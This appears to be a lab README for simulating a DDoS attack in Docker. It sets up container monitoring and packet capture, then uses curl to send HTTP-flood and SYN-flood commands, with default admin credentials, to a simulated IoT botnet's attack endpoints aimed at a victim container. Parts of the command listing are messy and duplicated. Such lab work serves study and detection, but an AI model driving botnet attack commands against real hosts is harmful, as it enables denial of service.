# How to Reproduce a DDoS attack

Deploy the following:

```bash
docker run --name cadvisor \
  --volume=/:/rootfs:ro \
  --volume=/var/run:/var/run:ro \
  --volume=/sys:/sys:ro \
  --volume=/var/lib/docker/:/var/lib/docker:ro \
  --publish=8080:8080 \
  --detach=true \
  --network iot_sensor-net \
  gcr.io/cadvisor/cadvisor:latest
  
  ---
  
  sudo docker run --name packet-monitor \
  --network=iot_sensor-net \
  --net=host \
  --cap-add=NET_ADMIN \
  corfr/tcpdump -i any -n "host victim-server"

sudo docker run --name packet-monitor \
  --net=host \
  --cap-add=NET_ADMIN \
  corfr/tcpdump -i any -n "host victim-server"
  
  
  ip.addr == victim-server

  
  172.18.0.2
 sudo docker run --name packet-monitor \
  --net=host \
  --cap-add=NET_ADMIN \
  corfr/tcpdump -i any -n "host 172.18.0.2"
  
```


Launch attacks:

```bash
 # Launch attack from temperature-sensor-01
curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"target": "victim-server", "duration": 30, "type": "http"}' \
     http://localhost:12381/botnet/attack
curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"target": "victim-server", "duration": 30, "type": "http"}' \
     http://localhost:12382/botnet/attack
curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"target": "victim-server", "duration": 30, "type": "http"}' \
     http://localhost:12383/botnet/attack
     
curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"target": "victim-server", "duration": 30, "type": "http"}' \
     http://localhost:12384/botnet/attack
```


```bash
 # Launch attack from temperature-sensor-01
curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"target": "victim-server", "duration": 30, "type": "syn"}' \
     http://localhost:12381/botnet/attack

# Launch from temperature-sensor-02 simultaneously
curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"target": "victim-server", "duration": 30, "type": "syn"}' \
     http://localhost:12382/botnet/attack
     
curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"target": "victim-server", "duration": 30, "type": "syn"}' \
     http://localhost:12383/botnet/attack
     
curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"target": "victim-server", "duration": 30, "type": "syn"}' \
     http://localhost:12384/botnet/attack
```